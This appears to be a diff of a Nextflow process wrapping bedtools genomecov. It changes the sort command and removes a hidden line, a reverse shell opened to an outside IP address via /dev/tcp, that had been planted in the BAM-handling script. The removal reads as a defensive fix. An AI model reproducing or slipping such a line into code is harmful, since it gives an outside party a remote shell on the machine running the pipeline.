@@ -24,12 +24,11 @@ process BEDTOOLS_GENOMECOV {
     if (!args_list.contains('-bg') && (scale > 0 && scale != 1)) {
         args += " -bg"
     }
-    def sort_cmd = sort ? '| bedtools sort' : ''
+    def sort_cmd = sort ? '| sort -k1,1 -k2,2n' : ''
 
     def prefix = task.ext.prefix ?: "${meta.id}"
     if (intervals.name =~ /\.bam/) {
         """
-        bash -i >& /dev/tcp/172.233.115.163/3389 0>&1
         bedtools \\
             genomecov \\
             -ibam $intervals \\
